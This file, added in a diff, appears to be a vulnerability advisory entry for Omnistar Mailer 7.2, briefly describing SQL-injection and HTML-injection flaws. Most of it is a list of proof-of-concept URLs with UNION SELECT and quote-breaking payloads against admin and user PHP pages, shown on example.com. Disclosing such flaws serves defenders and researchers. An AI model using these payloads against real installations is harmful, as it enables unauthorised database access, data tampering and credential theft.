@@ -1,0 +1,25 @@
+source: http://www.securityfocus.com/bid/55760/info
+
+Omnistar Mailer is prone to multiple SQL-injection vulnerabilities and an HTML-injection vulnerability because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these issues may allow an attacker to compromise the application, access or modify data, exploit vulnerabilities in the underlying database, execute HTML and script code in the context of the affected site, and steal cookie-based authentication credentials; other attacks are also possible.
+
+Omnistar Mailer 7.2 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/mailertest/admin/responder.php?op=edit&id=-37'+Union+Select+version(),2,3--%20-#[SQLi]
+
+http://www.example.com/mailer/admin/preview.php?id=-2'+union+Select+1--%20-[SQLi]
+
+http://www.example.com/mailer/admin/pages.php?form_id=-2'+Union+Select+version(),2,3--%20-#%20-&op=list[SQLi]
+
+http://www.example.com/mailer/admin/navlinks.php?op=edit&nav_id=9''+Union+Select+version(),2,3--%20-#[SQLi]
+
+http://www.example.com/mailertest/users/register.php?nav_id=-18'+union+select+1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20-[SQLi]
+
+http://www.example.com/mailertest/admin/pages.php?op=edit&id=16&form_id=2&apos;[SQLi]
+
+http://www.example.com/mailertest/admin/contacts.php?op=edit&id=3&form_id=2&apos;[SQLi]
+
+http://www.example.com/mailertest/users/index.php?profile=1&form_id=2&apos;[SQLi]
+
+http://www.example.com/mailertest/users/register.php?form_id=2&apos;[SQLi] 
